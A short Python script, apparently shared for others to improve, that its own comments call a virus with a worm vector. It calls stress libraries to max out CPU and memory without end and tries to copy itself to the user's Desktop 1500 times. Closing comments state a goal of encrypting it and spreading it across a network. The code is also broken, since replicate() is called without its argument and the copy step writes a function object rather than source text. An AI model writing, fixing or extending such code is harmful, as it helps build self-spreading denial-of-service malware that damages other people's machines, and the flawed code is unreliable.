import os
from stressinjector.cpu import CPUStress
from stressinjector.memory import MemoryStress
import getpass as gp

user = gp.getuser() # gets user of the OS
location = r'C:\Users\{0}\Desktop\\'.format(user) # gets windows path (or whatever)
replication_amount = 1500 # times to replicate

def virus():
    CPUStress._infinite() # Stresses 5 Cores of the CPU infinitely 
    MemoryStress().run() # Stresses 10GB of RAM infinitely

# Replication function (worm vector)
def replicate(folder):
    os.chdir(folder) 
    file = open('main.py', 'w+') # copies this program to another directory
    file.write(virus)
    file.close()
    os.chdir(location)

for replication in range(replication_amount + 1):  # Replicates 1500 times + 1 time each replication
    replicate() # instantiates
    virus() # runs the virus
    
    
# The goal would be ultimately to encrypt it and move it across a network. 
# If you can please feel free to improve this code
